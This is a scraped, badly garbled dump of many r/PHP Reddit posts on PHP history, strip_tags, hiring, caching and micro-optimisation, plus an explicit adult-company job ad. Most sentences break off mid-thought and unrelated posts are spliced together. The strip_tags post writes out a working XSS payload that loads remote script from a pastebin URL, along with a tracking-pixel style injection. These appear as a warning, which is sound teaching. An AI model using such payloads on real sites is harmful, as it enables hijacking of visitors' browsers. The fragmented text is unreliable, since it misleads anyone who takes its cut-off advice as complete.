1342151149.0,whc4r,History Lesson: What PHP coding was like in 1996,hopeseekr,231,57,60,"I started programming in PHP in mid-1996

I was 14 years old

I was lurking one day on Usenet Perl forums when I saw an announcement about the release of PHP 2.0/FI

In 1996

There wasn't a single PHP IDE for about 5 years

----

How did I learn? I went to the bookstore and poured over books (at least in the PHP 3 and 4 days). When I started with PHP/FI 2.0, Usenet, and by talking to people on the PHP mailing list and on IRC. 

I haunted IRC for a decade helping people out

----

Hell, then 5).  It was a daemon that spoke the entire IRC RFC; it acted as both a server and a client, as a DCC fileserver, you could issue it commands via a web page, PHP-GTK+ client, SSH, Telnet

At one point it turned into a major file sharing facilitator on Undernet, and who shared what on which channel.  It would monitor all the text on as many IRC channels as my 56k baud modem and 600 MHz AMD Thunderbird could handle (more than you'd think, but not much), and when it saw someone's share script advertise their file list, it would ask for it, download it from them (via XDCC), parse it

It would also accept /msgs from users of the type: /msg phpbot @search file*pattern.  The bot would then /msg them back telling them the top 5 locations (channels, putting great load on my 600 MHz.

That's how I learned how to optimize SQL tables and queries

The name of it is PHP-Egg

Between the days of the Napster and Audiogalaxy diasporas and the rise of ED2K and bittorrent

----


How did I find the function I wanted?  I had three good books with good indexes. I would pour over the index, and find out how to type.


This current generation of neophytes who can't even bother to google something is really really scaring me when it comes to our future prospects as a civilization.

----

I'm now 30 years old. I've been programming almost continuously and exclusively in PHP

I used to think I had it all figured out. That was 2003; I had been a PHP program for 7 years. Then I was humbled... again and again.

I'm still humbled. Continuously.  I look code I wrote 6 months ago and I'm ashamed. Code written a year ago appalls me.  I talk with other developers I really respect and we share the same sentiments.

It's a good metric: If you aren't ashamed of what you wrote 6 months ago

1324340915.0,nj5t0,What everyone should know about strip_tags(),midir,167,22,44,"**[strip_tags](http://www.php.net/manual/en/function.strip-tags.php)** is one of the common go-to functions used for making user input on web pages safe for display. But contrary to what it sounds like it's for

1. It can eat legitimate text. It turns ""*This shows that x&lt;y.*"" into ""*This shows that x*""

2. It doesn't prevent typed HTML entities. People can (and do) exploit that to bypass word filters &amp; spam filters.

3. Using the second parameter to allow some tags is 100% dangerous. It starts out innocently: someone wants to permit simple formatting in user comments and does something like this:

` `

    $message = strip_tags($message

But attributes on tags aren't removed. So I could come to your site and post a comment like this:

    &lt;b style=""color:red;font-size:100pt;text-decoration:blink""&gt;hello&lt;/b&gt;

Suddenly I can use whatever formatting I want. Or I could do this:

    &lt;b style=""background:url(http://someserver/transparent.gif);font-weight:normal""&gt;hello&lt;/b&gt;

Using that I can track users browsing your site without them or you knowing.

Or if I was particularly evil

    &lt;b onmouseover=""s=document.createElement('script');s.src='http://pastebin.com/raw.php?i=j1Vhq2aJ';document.getElementsByTagName('head')[0].appendChild(s)""&gt;hello&lt;/b&gt;

Using that I could inject my own script into your site, such as to display fake messages or shock images. It could exploit your site's reputation to trick users into downloading malware. A single comment could even spread across the site rapidly, virally by submitting new comments from the user who views it.

You can't overstate the danger of using that second parameter. If someone cared enough

The second parameter doesn't work decently even for known safe text. Usage like `strip_tags('text in which we want line breaks&lt;br/&gt;but no formatting'

---

If you simply want to prevent HTML and formatting in user-submitted input, otherwise the text will appear on one line. (++Edit: You should know what character set you're using (and if you don't, aim to use UTF-8 everywhere as it's becoming a web standard). If you're using a weird not-ASCII-compatible character set, you must specify that as the second parameter to htmlspecialchars for it to work properly.)

~~For when you want to allow formatting, [Markdown](https://secure.wikimedia.org/wikipedia/en/wiki/Markdown), [BBCode](https://secure.wikimedia.org/wikipedia/en/wiki/BBCode), and [Wikitext](https://secure.wikimedia.org/wikipedia/en/wiki/Wiki_markup).~~

For when you want to permit formatting, it allows HTML and is not safe on its own. (It is a formatter and not a sanitizer). Use of HTML and/or Markdown for formatting can be made fully safe with a sanitizer like **[HTML Purifier](http://htmlpurifier.org/)**, which does what strip_tags was supposed to do. [BBCode](https://secure.wikimedia.org/wikipedia/en/wiki/BBCode) is another option.

If you feel the need to make your own formatter

---

The only appropriate time to use strip_tags would be to remove HTML that was *supposed* to be there, then using strip_tags, followed by [htmlspecialchars_decode](http://www.php.net/manual/en/function.htmlspecialchars-decode.php) or [html_entity_decode](http://www.php.net/manual/en/function.html-entity-decode.php) will do that. (In this case, strip_tags won't have the flaw of removing legitimate text because the text should have already been properly escaped as entities when it was made into HTML in the first place.)

**1\.** If you want the best candidates, but if you have no big names behind you and no venture capital, I wouldn't even give you a second glance. (Personally, I've written start-ups off my list altogether, as I have no desire to work 80 hours a week for a company with little direction that will most likely fizzle out in a few years.) 

If your company is established, is going to help you develop Wordpress plugins all day. No one.

**2\.** If you want the best candidates, this means in the $110k - $125k+ range. If you want people who are already working, you have to make it worth it to them to change their jobs. And once you're willing to offer these salaries to the point where your ideal candidate would consider relocating to near your offices, you have to compete against the more prestigious companies to which a candidate could also relocate. Google, Microsoft, and Yahoo are all in LA. Can you offer a better workplace, more benefits, but if you want to get the best candidates

**3\.** If you're a recruiter, I'm not going to contact you at all.

**4\.** Specifically to the hiring manager in the previous thread: If you want a computer scientist, is trivially easy. There are a million examples on the web, even for PHP. There's a reason there aren't any programming challenges that fall along the lines of ""demonstrate inheretance and abstraction.""

Instead, just ask what kind of approaches they would take to the problem, or how they would represent the data). If they can answer questions like that, chances are they understand when to use the `static` keyword and when not to. When a candidate demonstrates knowledge of things like these, whether they know *the new stuff* in PHP 5.3 is trivial, because if they don't know it, they will pick it up immediately.

**5\.** The original post doesn't mention anything about intangible skills (this was probably intentional, offer constructive ideas and criticism when necessary. I've never worked in an environment where those weren't critically important to the overall effectiveness of the team. The original post OP said he didn't read resumes; the resume is one of the best ways to tell if a candidate can form a sentence, construct ideas, and get across a cogent point. Why in the world would you not read resumes? You're hiring developers who need to communicate, not trolls who will sit in a dark dungeon all day not speaking (at least I hope not).

**6\.** And for the love of all that is holy, or *guru* to describe the position.

Am I expecting too much?",McGlockenshire,129,34,http://www.reddit.com/r/PHP/comments/1hjnb9/trying_to_hire_lamp_devs_and_theyre_all_flaking/, we issue a coding task if the user doesn't have any published code samples.

We've gotten three -- *three* -- tasks back.  One was amazing, so it was a trainwreck, but an *amazing* trainwreck.

All of the other devs have come up with some *excuse* to not complete the code task within the week we usually give.  Some are very straightforward and honest, that offer on the house came through so I'm not gonna be moving"" or the ""senior"" guy that said ""you can't seriously believe that this task will only take two hours, this is gonna take me eight to ten!""

Let me summarize the task.  Some requirements have been changed to protect the innocent.

1. Design a database schema to store your personal book collection.  You need to keep track of *at least* the title of each book, the publishing year, and the publisher.  You may add additional fields as you see fit.
2. Create three queries against the schema
  1. All books, then release year, showing the author, publisher, year, and book title.
  2. All books
  3. All authors and their total book and genre counts.  Do not use COUNT(DISTINCT ...).
3. Create a small PHP application to display the results of the three queries, etc) *other* than something to do the XHR, with a preference towards Prototype instead of jQuery.

In all the *seven* years that we've given this task

To be clear

- Did they think about the fact that a book can have multiple authors and genres? (Sometimes) 
- Better yet
- Did they achieve Third Normal Form?  (Usually)
- Did they use foreign keys?  (Almost never)
- Did they pull off the third query without resorting to doing a loop in PHP? (Never) 
- Did they pick something other than jQuery to do XHR? (Almost never
- What's their PHP look like? 
- Did they separate business logic from display logic? (Usually)
- Did they use OO or did they keep it procedural? (Usually procedural
- If they used OO
- Is the code clean
- What's their commenting style? 
- Did they create unit tests? (Someone did this once!) 

Etc

Are my expectations too high?  Is this task really that demanding?  Keep in mind that we only issue this task when the applicant *doesn't* have published code samples... and we've only had that happen once so far.  We're thinking about switching the timing on the task so it's done *during* the interview so that the applicant *can't* flake out.  The schema can be whiteboarded

------

e: So it's pretty clear from the comment votes that a lot of people think that this task is excessive

Then i decided to move into programming. I learned php 4 and i began to create my own cms which lead me to work mantaining software in a company back home.

I've been working the last 5 years developing in php with a custom framework from the company. 

I learned about databases: MySql

Some of the fun was in all those new js frameworks like JQuery and Dojo.

Now in my thirties

- In the old days
- Ten years ago you got away with some spaghetti code and procedural approach. Today you have Object oriented code
- Photoshop used to be enough to make decent graphics. Now design has to be adjusted to grids and responsive design
- Php used to be enough for most of web application development. Today we have Python, Cake, Zend, Symphony
- What used to be just flash
- Now we have NoSql databases

So right now i need some advice because im kind of lost facing so many possibilities.

I want to learn the MVC approach, Zend or Symphony more naturally.

What should i focus first? web design tools? frameworks? mobile programming? NoSql databases?

I like to do both. Web and applications

I feel old....

3. They now use jQuery to enhance their UI
4. Loading the jQuery javascript library EVERY SINGLE PAGE slows the app down considerably, and not phpMyAdmin)
5. The inline editing box has syntax highlighting, and starts scrolling the window before you have reached the edge. This has two main concerns... Firstly, what's wrong with letting the browser scroll the window on edge detection? Secondly, as a user, *I never want horizontal scrolling!!!* Once I type out my query, I have to grab my mouse and click the scrollbar in order to hit the ""Run"" button.
6. When running an `ALTER TABLE` query using the SQL page
7. The table creation is sequestered into its own modal, it falls back to its own page. *(-- [Draders](http://www.reddit.com/user/Draders))*

1. No foreign key support (or if there is

Mainly, I will admit), but it seems as though with evey new version, there are one or two new ""features"" which invariably break old behaviour, or are not UI optimized.

1. CSS enhancements - I have no problem with this

UI bugs I can deal with

1) PHP is not thread safe

In reality this hasn't been true for a very very long time. TSRM has been discussed and explained in other threads on reddit

2) pthreads is old fashioned

The pecl extension pthreads and Posix Threads are not nearly the same thing

pthreads does not mean Posix Threads when we talk about php, no where near it ...

3) pthreads does not include everything you need to execute safely

Simply wrong; as it says in the documentation, all the time ... 

4) pthreads unsafely shares memory among contexts in order to provide concurrent functionality

Again, it will make absolutely no difference because the data you pass is always a copy; pthreads utilizes copy on read and copy on write to maintain the shared nothing architecture and keep sane the executor.

5) pthreads is beta and should be avoided at all costs

I marked pthreads beta because of what it is. Lots of people are using pthreads in production and I've been asked multiple times to change the status of the extension such that network managers will allow devs to install it.

One day, beta doesn't mean unusable, it means that you may experience an error or the unexpected, those that have read documentation and examples should have less problems, and everyone should report every bug they find either on bugs.php.net or github.

Multi-threading in PHP sounds like some sort of voodoo, it leverages bundled functionality and the object API to provide true userland multi-threading.

I encourage anyone looking at pthreads to read every single example included, but, we are pushing the envelope, there isn't a million ways to do everything as there normally is in PHP, there is a single, correct way to do things, and they are pretty well documented by now.

Historically, the edge cases crept further inwards with every major version of PHP.

Opcache is now part of the PHP core, as Opcache comes with no such facility - and it won't either.

Before you go thinking ""I'll just use memcached or redis"": everything has it's place, when requested, it is then converted from the stored value into a type Zend understands. While each implementation of a key/value store may have benefits APC doesn't have, none of them have one key benefit: APC talks the language of Zend; when you send a value to APC, it is bitwise copied, same type/format into the store, when you request it again, you shouldn't be caching those anyway

Onto your options ... when it became apparent to us that PHP would be left without a user cache, APCu was born. APCu is APC without opcode caching, it has a full backward compatibility mode and should not require changes to software. Laruence, a very very gifted programmer, devised a very clever cache named YAC, this is a lockless (theoretically very fast indeed) cache, lockless has implications that are too boring to talk about, as a community we are waiting for feedback on YAC.

What's so great about opcache, Opcache is a better opcode cache and provides the additional benefit of being able to optimize your stored opcodes, always executing the optimized ones. We'll not go into what optimizations are done ... Opcache has a much simpler allocator than APC, very suitable for an opcode cache (not at all for a user cache), this makes it hungrier for RAM than APC in most setups, but who really cares about that, just make sure you do your homework before you deploy !!

ircmaxell, schmalls, nikic also got the 61 character solution

Here's a link to the top 10 submissions. their usernames are in the function name

http://codepad.org/rU7Fxts0

---------

I've done some one-liner challenges before and some people enjoyed them so im going to try another contest.  This time minus the one-liner part...that part seemed to cause arguments on the definition of a one-liner.

**Rules**
----------

Given a hand of cards in the format

    array( '2c', 'jh', '10c' )

determine if the hand contains a straight (straight flush counts too).

PM me your code in the format:

    function check_straight( $hand ) {
        //Your code here
    }

Least number of characters in a working function wins

**Notes:**

* I have error reporting set to E_ALL. No notices/warnings etc... can be thrown.
* I will be testing the code on PHP 5.3.6
* [Here is a function to generate a hand](http://codepad.org/4w3GmGIo)
* Aces are high **AND** low
* You must minify your own code
* I have a working solution
* As people send me working solutions i will post their character count as edits.
* **A straight flush should return true as well**
* Input parameter must stay `$hand`
* 10 cards are 3 characters ( 10h, 10d )
* **NO USING @**
* Deadline is may 10th at 12pm noon PST

Winner gets 3 months of reddit gold.

http://www.reddit.com/r/PHP/comments/1h63d3/entrylevel_php_job_interview_help/

I followed pretty much all of the advice you guys gave me. So here's the update

The interview consisted first of a spoken question and answer session. The first thing they said was, and just went silent for like 10 full seconds. Then I took a sip of water and managed to give them a pretty decent response, which was like a 3-minute version of my life story as it relates to programming and technology.

Once they responded favorably to that 3-minute bio, and these guys seemed just like me.

They went on to ask a lot of questions about technology. What languages I've worked with, what are the advantages of object-oriented programming vs procedural programming, etc. I seemed to have at least a cursory knowledge of pretty much everything they asked me about.

After that was a written test (pen and paper). My handwriting is just awful

Then I got a tour of their facilities. This is when I started to think I might get the job

The whole process lasted about 2.5 hours.

On my drive home I was thinking about some answers I gave on the written test, and took that opportunity to correct my mistake.

A few minutes after I sent that email, and was offered the job.

The commute was a killer (doable

Starting this Wednesday, I've always admired great software developers, and I see this as my opportunity to become one of them.

I've been told the first thing they're going to do is get me familiar with Magento

Knowledge of Memcached is a plus but not necessary as it is simple. Previous experience in high-traffic environments will get you to the front of the line (we're talking millions of uniques per month and racks of servers). The codebase we're working on now is new so we're only dealing with object oriented MVC-style PHP5. Moderate JQuery skills also required.

Pay commensurate on experience but we're looking for mid-level; you don't need to architect the system but you should be comfortable diving into a new codebase and delivering stand-alone projects based on the established code style. Reply here / Send me a message / or email weneedadev@gmail.com

We can still find notes on there dating as far back as 14 years or more.

[See the oldest user note still around on php.net today](http://us.php.net/manual/en/function.reset.php#48)

The question, the ""date"" function seems to get a disproportionate amount of traffic on php.net compared to all other functions. Yet, it only holds 31 notes as of today whereas a function like *strtotime* has **123 notes*** currently listed. There seems to be no obvious pattern as to why people find it compelling to submit a user contributed note to php.net for one particular page over another.

The code for the user notes system is pretty old and quickly withering away due it's old age. I've spent some time over the past few weeks to try and see what I can do to revive it a bit and perhaps introduce some new useful features that might help bring it back to life. I started with offering features that have been demanded since long before I showed up.

* Voting - (Users can now vote notes up or down)
* Flagging - (Users can now notify a moderator when something is wrong)
* Sorting - (Notes can be ordered by their popularity and integrity as opposed to age)

These are just a few of the improvements I started with. The current system leaves a lot to be desired

For one

Despite all of these challenges and short-comings,000 submissions since their birth. Their original purpose was to server improving the documentation. If a note provides something the documentation missed, or doesn't cover clearly enough it should be integrated into the manual. Notes can provide corner-cases that aren't always noticed until the feature gets used and abused by the community and someone discovers an edge case the documentation hasn't accounted for. Notes seem to have also started some code repository on php.net that I'm not entirely certain is helpful, but regardless some people tend to find some *diamond in the ruff*, if you will, every now and then.

A simple demonstration of these features can be tested out here: (http://php.sheriframadan.com/manual/en/function.strtotime.php#109929)

I'm not sure what the answer is to be honest

1368908025.0,1eld2t,Why would anyone choose Laravel over Symfony or Silex?,xewot,67,17,29,"So this will be a rant post as I am right now looking into Laravel and I'm coming from the Symfony/Silex world. I see many things that I would not want to have in any of my projects. Please correct me if I'm wrong.

Here is what I found and think about it:

* I can install it with __download__. Where is the composer.json with the dependencies? We have composer (http://getcomposer.org) why __not__ use it? The problem? What if I'm deep in project-development and laravel updates a security leak ... do I then copy my application in the next downloaded  version? Without composer
* I don't like tabs. I prefer spaces. That's my own problem
* Heavy use of statics and constants. Problem here: [hard to test
* __No guideline to write good architecture__. Just a ""put your code here and all will be fine"" mind setting I get. There is this bundles folder but the documentation does not state you should use them as first citizens to keep it clean. The same thing I criticize about Zend, but if they stayed on the framework-documentation they would just not know it better.
 

One good thing: Laravel uses Symfony/HttpFoundation. It wraps PHPs superglobals. Read the article of igorw about the [Value of HttpFoundation](https://igor.io/2013/02/03/http-foundation-value.html).

To state my point why I would from here on always choose a framework that uses best practices of our time with composer

As a hiring manager

Here are the things that I care about, I look mostly at education to see if you have at least a B.S. in Computer Science or related degree but that is not really important as having solid code samples that demonstrate the qualities in code that I'm looking for (but having a degree can put you over the edge if I'm comparing two similar candidates).

Here's what I'm looking for:

- You write code in PHP 5.3+ (no deprecated methods

- You understand object-oriented programming (don't show me classes where you're still using var $x; where is the variable scope? inheritance

- You use or have used MVC's (such as codeigniter, symfony, yii, etc. I don't care which, as long as you have demonstrable knowledge of the paradigm) -- I want you to be able to tell me what you like about fat controllers, lean models or lean controllers and fat models and why.

- You have an understanding of OOP design patterns such as factory, etc. You don't have to know them all, but if you know at least a couple that is great. Where does it make sense to use the factory pattern? The singleton pattern? There's a lot of objectiveness and opinions around these topics but that's fine--I want to know if you understand their uses and what they're good for.

- You understand data and information! You can write SQL queries, sub-queries, foreign key constraints, etc. The ideal candidate understands the principles of database design and can build normalized tables and knows when de-normalization can be helpful. (This area, I feel like a candidate only at the minimum needs to understand up to joins, sub selects and foreign key constraint).

- What are the things you do to protect from SQL injection

- Do you also know JavaScript? (it's getting more and more difficult to do web development without knowledge of JavaScript) -- What frameworks do you use? jQuery? Do you understand AJAX/asynchronous calls?

- The web's getting very de-centralized and more and more websites/applications need to communicate with third-parties/vendors/web services/etc. 

Do you understand data formats such as JSON and XML? Have you integrated with third party software/API's? Do you know how request headers/bodies and response headers/bodies work? 

- Have you used a version control system such as SVN/Git?

Plusses but not required:

- Have basic knowledge of SEO in terms (are you generating dynamic pages by passing ids through the query string still?)

- Have basic knowledge of web analytics (if you understand JavaScript and asynchronous calls

Code samples don't do's:

- Don't send your custom database wrapper class; I'd rather see your prepared SQL statements or examples of more complicated queries you have done that may include joins

- Don't send code with unsanitized SQL statements! 

- Don't send code ripped from another source

- Don't send code using deprecated methods

- Don't send code that lacks convention (are you using both camelCase for some variables and under_scores in another?

- No globals!

Code sample do's:

- Write a set of classes that demonstrate a pattern such as factory

- Demonstrate inheritance and extensibility

- Show how you would sanitize and validate user input

- Show how you would sanitize output from the screen that comes from user input

I'd love to hear feedback from you guys. Are these requirements too tough and unreasonable? If so

And now I want to make review of them. Sorry if I made a lot of mistakes

&gt; 1. If a method can be static

This is a really good practice till you don't write unit-tests and don't use service-oriented patterns (IoC). You just can't write unit test for static method.

&gt; 2. echo is faster than print.
&gt; 3. Use echo’s multiple parameters instead of string concatenation.

If you are using echo or print so often then you are likely making some small personal page and you can choose what you want and not to think about speed of your code (this is just personal page that won't be visited by thousands of users each second). But if you are making big project then you will likely need abstraction wich will provide you Request and Response objects (this way you can easily work with cache like varnish and don't got wasted code with ob_* calls for example).

&gt; 4. Set the maxvalue for your for-loops before and not in the loop.

This is good advice and it doesn't matter what language are you writting with.

&gt; 5. Unset your variables to free memory

If you have big project then you will likely make use of OOP and, because when object will have a zero count of references it will be removed from memory. But if you're making batch operations with hundreds or thousands of objects then yes, you need to use unset.

&gt; 6. Avoid magic like __get

Magic __get/set is evil, will make your code slower. But what about autoload - you can choose between it and require_once, this is just the matter of your choice, but I think code without any ""require""s are cleaner and more readable.

&gt; 8. Use full paths in includes and requires

Use __DIR__ constant in your autoload file.

&gt; 11. str_replace is faster than preg_replace

My opinion that strtr in many cases is better just because I can pass array like [""i want to replace this string"" =&gt; ""to this string""

&gt; 14. Error suppression with @ is very slow.

You are writting bad code if you need to suppress errors

&gt; 17. $row[’id’] is 7 times faster than $row[id]

Again, but when PHP don't find this constant you got a string ""key"".

&gt; 18. Error messages are expensive

Maybe they are expensive

&gt; 20. Incrementing a local variable in a method is the fastest. Nearly the same as calling a local variable in a function.
&gt; 21. Incrementing a global variable is 2 times slow than a local var.
&gt; 22. Incrementing an object property (eg. $this-&gt;prop++) is 3 times slower than a local variable.

You are writting in PHP

&gt; 26. Methods in derived classes run faster than ones defined in the base class.

Ok then fuck inheritance

&gt; 28. Surrounding your string by ‘ instead of ” will make things interpret a little faster since php looks for variables inside “…” but not inside ‘…’. Of course you can only do this when you don’t need to have variables in the string.

This is matter of choice

&gt; 30. A PHP script will be served at least 2-10 times slower than a static HTML page by Apache. Try to use more static HTML pages and fewer scripts.

Yeah

&gt; 31. Your PHP scripts are recompiled every time unless the scripts are cached. Install a PHP caching product to typically increase performance by 25-100% by removing compile times.

Yes, this is good advice.

&gt; 32. Cache as much as possible. Use memcached – memcached is a high-performance memory object caching system intended to speed up dynamic web applications by alleviating database load. OP code caches are useful so that your script does not have to be compiled on every request

No

&gt; 33. When working with strings and you need to check that the string is either of a certain length you’d understandably would want to use the strlen() function. This function is pretty quick since it’s operation does not perform any calculation but merely return the already known length of a string available in the zval structure (internal C struct used to store variables in PHP). However because strlen() is a function it is still somewhat slow because the function call requires several operations such as lowercase &amp; hashtable lookup followed by the execution of said function. In some instance you can improve the speed of your code by using an isset() trick.Ex.

Another one small optimization

&gt; 34. When incrementing or decrementing the value of the variable $i++ happens to be a tad slower then ++$i. This is something PHP specific and does not apply to other languages

Yes
    &lt;?php
    for ($i = 0; $i &lt; 1000; $i++)
        doSomething();

You know that $i++ is **post**-increment

&gt; 39. Make use of the countless predefined functions

Oh god yes. I see many of developers don't know about many of php's functions and write some extra code.

1339104360.0,uqg8u,"Would appreciate advice with managing my first ""high"" traffic server.",daulex,61,15,70,"Hi everyone!

I'm going to write a detailed description of what goes on inside my server in order to help you with noticing potential issues. I'm very new to managing servers and am running an almost stock lamp-server on ubuntu 10.04 lts. Thank you for reading.

I've recently built a simple system that manages flash(and soon html) banners for our clients

We are renting a VPS ""cloud"" server at rackspace (8 gb ram at the moment for safety) and we are currently serving around 140 requests per second(highest I've seen this week

When the client updates the data inside of a banner

When a visitor views a swf banner, then requests the images and displays it all. The swf then sends a straight get request with it's own id and the page the swf is being displayed on back to my server. This request gets caught by a single file, which uses PDO to make an INSERT into mysql, and a view is created(each view has it's own row, with 3 cells: banner id, timestamp, url)

I've been spending the last few nights optimizing and am wondering if there is anything else I can do.

Stuff I've already done: 

* apache: set keepalive off, here's my apache2.conf http://pastebin.com/0uA2SiDU I know it's not pretty, but I don't even know which of the ifmodules is being read, that's how new I am to this
* mysql: disabled persistent connections
* code: taken out the insert view script from codeigniter and made a separate file for it, data cleaning, pdo execute, pdo connection = null, die();
* mysql: ~~taken out id(with auto_increment) from the views table as I've read that this becomes pretty performance intensive when you start reaching 6-7 digit numbers with my number of writes per second~~


This will probably be useful:

* htop 16 minutes after server start: http://i.imgur.com/5fIcV.png
* htop 32 minutes after server start: http://i.imgur.com/xddvd.png
* htop 46 minutes after server start: http://i.imgur.com/C2HUs.png
* apache2ctl -M http://pastebin.com/GFghA8Fu

The above stats are with roughly 90 requests per second in apache.

One thing that really annoys me: Say the server is doing 100 requests per second and is eating 3 gb of ram (physical memory used), but it's now eating 1.5 gb of ram, 24 hours later it's serving 80 requests per second and eating 4 gb of ram. Restart, same story all over, what gives?

Microtime returns a [unix time stamp](http://php.net/manual/en/function.microtime.php) in microseconds.  I tested this on my local development setup (WAMP on Windows 7) and on a budget VPS as well

On my local machine averaging several tests together provides the following results:

    Periods          Commas         Difference
    0.107409418      0.084699512    0.022709906

Given that this represents a truly staggering amount of this type of problem,000,000 times but honestly it just about crashes my browser.

What about on an actual server though?  This is where things get more interesting:

    Periods          Commas         Difference
    1.461359978      1.459618509    0.001741469

Here we see even less of an improvement

For the memory testing

While it is true that the version with the commas used less memory, 16 bytes.  This, like the speed increase is almost immeasurable.

This is why you do not bother with ""micro optimizations"".  At the end of the day they have no relevance in the real world even if you can demonstrate that they are theoretically faster.  The *only* deciding factor in this case on which style you use

A few months ago

I was tasked with creating a huge CMS system from scratch basically

I realized quickly that there was a lot more to PHP than meets the eye.  A few months before I had gotten this gig, I was a little in too over my head.

As I got going though, but I just kept going back and changing the function to add or remove different things I needed for it to do.

You could say that while I was developing this software

One weekend

I had found one that I liked that has great documentation

After a few hours of watching videos and messing around

At first it was a weird feeling.  There was a lot of configuration to do when first setting up your new application

The only difference this time from learning PHP from scratch to learning a framework

In the past few days, and I feel more confident about the code I am writing than I was when I first started the project.

--------------------------------------------------------------

I believe that the way to get the most out of the framework is to find one that works for you, and even if you are just starting or you are just doing some work on the side, they will help you code like you've been doing it for year.

You need to trust the framework

I just thought I'd give a little insight of how I came about using a framework.  I know it's tough to pick up at first

Not only is Symfony2 performant and taking advantage of new PHP features (some bundles are already using traits)

With Zend Framework 2 now being released I find I'm completely unmotivated to invest more time learning another MVC framework that appears to accomplish the same set of goals that Symfony2 has already covered.

Are there redeeming reasons to look at Zend Framework 2 as an alternate to Symfony2?

I am now moving into taking over backend development in my (very small) company for our main products which are very high traffic and pretty data intensive that face continual scaling.  We are an Apache / PHP 5.3 house using MySQL, and NodeJS.


We are looking to move away from Zend, I have used things like Core Data for iOS apps which, while not exactly an ORM, is a pretty similar concept for most use cases.


So while I'm on board with switching away from ZF


The other developer here, so I don't feel like I need the helping hand that ORMs seem to be.  From a performance stand point, I could find very little on ORM benchmarks (I found one from 2011 and it showed ORMs far behind standard queries through PDO).

Morning folks

I'm an employed PHP developer and I use PHPStorm. It's a great IDE

My problem is that I know my working practices are poor - really poor. I might as well be using notepad for all my developing. Here's a list of things I don't do (despite having used

* I don't use version control
* I don't develop locally
* I don't unit test
* I don't use build and deploy solutions (such as Phing)

In other words

I know how to use git and hg; I know about Phing and other build &amp; deploy methods and I know I should develop locally and ""never touch the live server"". I know what unit testing is and how to use it - but not in PHP.

So I began investigating and it turns out that no-one has compiled a nice ""here's how to setup a project that uses git, has unit testing"" type guide.

As I understand it

1. Develop a project locally
2. Use unit testing were appropriate - locally.
3. Commit changes to git
4. When changes are solid

We're an established, Monday-Friday. Sorry, no telecommuting!

Candidate must posses strong knowledge of PHP. You will be in charge of developing troubleshooting new and existing solutions for your day to day responsibilities. You will work closely with an off-show designer and programmer (the programmer does all the heavy PHP coding from his home in Bulgaria).

This is a front and back end web developer position. You MUST know how to take a design from PSD

You will interact with affiliates and answer their questions

You will come in and will be trained by the departing developer (me). I have created many custom programs to streamline the work day and to lessen my workload. Once I leave

** THIS IS AN ADULT COMPANY ** There is PORN involved.

Do you like to browser /r/nsfw during business hours and look at the stuff in a tiny 5px x 5px window so you won't get caught? NO ONE GIVES A FUCK ABOUT THAT HERE. We're a PORN company. You MUST understand this. ALSO: ~80% of our cash comes from the GAY side of porn. You don't have to be gay

I'm straight

We also have STRAIGHT sites/networks. You are free to jerk off to the content all you want (outside business hours

BENEFITS:

1. Extremely relaxed environment. You will be asked to wear a polo shirt and jeans/khakis for the first few weeks. After you settle in and get to know everyone
2. FREE PORN!
3. The owner likes going to the gym every single day and playing raquetball for an hour. Are you a lard ass that wishes he could lose some weight? He'll probably pick up your gym tab after your first month or two here, sweat! You WILL lose weight!
4. The owner owns a BBQ restaurant, too! You don't have to go if you don't want to, ya pansy.
5. Your own office! With a window! Get the fuck outta that rat-sized cubicle! I HAVE 3 MONITORS ON MY DESK AND NO ONE SAYS A SHIT BECAUSE IT'S ALL ABOUT $$$.
6. FREE PORN. Are you a nerd who never got laid and needs to go to xtube to jack off? Well
7. You get to decide how to advance your position! No one here will tell you your plans are too far-out. We have problems that arise every now and again

Men/women are welcome to apply. NO ONE UNDER 18. Fuck you kids

We are 100% LEGIT. Been in business for over DECADE. Position is SALARY

BONUS: every now and again we get pornstars coming to our offices and hanging out. You're welcome trying to get laid

Send me your resumes to juan@shawinternet.com TODAY. DO YOU NEED A JOB THIS WEEK OR WHAT? If I like you

edit:

A few points to clarify

* [This is our prize-winning brisket. Look at it. LOOK AT IT.](http://i.imgur.com/bGVF8.jpg). The boss has got a huge trailer smoker that you'll get to use if you want (at competitions I mean). If you're a vegetarian
* This is not primarily a back-end position. Do you know OOP, as long as it works and makes us money.
* This IS a primarily front-end position. You will need to know HTML/CSS + PHP/MySQL. You don't need to know the latest and greatest HTML5/CSS3 tricks. They don't usually make us money. We prefer, but it's up to you if that takes you too long (once you're seasoned it should take you less time than tables, actually).
* We have an off-shore programmer who created our ecommerce CMS for us. It's a horrible mess of spaghetti code, is in charge of dealing with that monster. If you want once you're experienced you can start playing around with it with him - but it won't be your responsibility (I pity whoever wants to work on it).
* We have a dedicated designer. I can't draw a stick figure to save my life. Doesn't matter. Our designer is one of the best. Plus he's high as a kite all the time for ""creative purposes"". Note: he's in Spain but is an Englishman. Don't speak to him about soccer unless you want a fistful of confused I'm-an-Englishman-but-my-wife-is-Spanish-and-I-live-in-Spain soccer fandom.
* We work in a professional office building off of Preston and George Bush. This isn't some dinky job in the boss's basement.
* I say ADULT PORN because we don't deal in the barely-18 shit. You're welcome to like that sort of stuff but we don't pursue it. Also

All in all

And I'm typing in a bunch of caps BECAUSE THIS IS A PORN COMPANY AND SOMETIMES I GET RANDOM BONERS THROUGHOUT THE DAY.

edit II:

Why all the downvotes? I guess if you don't agree with the job? Or are you saying that /r/PHP is not the place to post for a PHP-related position? Or maybe you're opposed to porn in general? I seriously don't get it. If you're downvoting because you think maybe this is a scam - we're very much a real company looking for someone immediately. Haha sorry I thought ""with the economy like it is"" people wouldn't be downvoting legitimate job opportunities just because.

I wanted to make a web interface for this

`&lt;?php system('eject'); ?&gt;`

I ran the script from command line (as www-data)

Running it as `eject 2&gt;&amp;1` gave me ""eject: unable to open '/dev/sr0'"".

I've since discovered that no matter WHAT I do

- executing a bash script which calls `eject`

- executing a C-wrapper to run `eject`

- setting the sticky bit on the C-wrapper so that it will run as root (an incredibly bad idea but I was desparate)

All to no avail.

Can anybody shed some light on why I can't run `eject` from PHP?

Thanks

I've read through hginit.com - and it explained why I should use a DVCS

I look at sites like github, or discard.

But since I'm the only developer here, committing locally, pushing to remote and committing to remote simply seems too bulky a process to me - but maybe it's because I haven't had it clearly explained yet.

Basically it's in the form of a script that does a few of the things you might use PDO for.

When you call the `prepare` method on a `PDO` instance

I'll write a simple script to demonstrate:

    &lt;?php
    // IF YOU ARE USING PHP &lt; 5.3

    // This instantiates a PDO object (http://php.net/pdo)
    $pdo = new \PDO(""mysql:host={$host};dbname={$db_name}""

    // Personally I like PDO to throw back any errors it has as exceptions. If you don't want to delve
    // into exceptions just yet
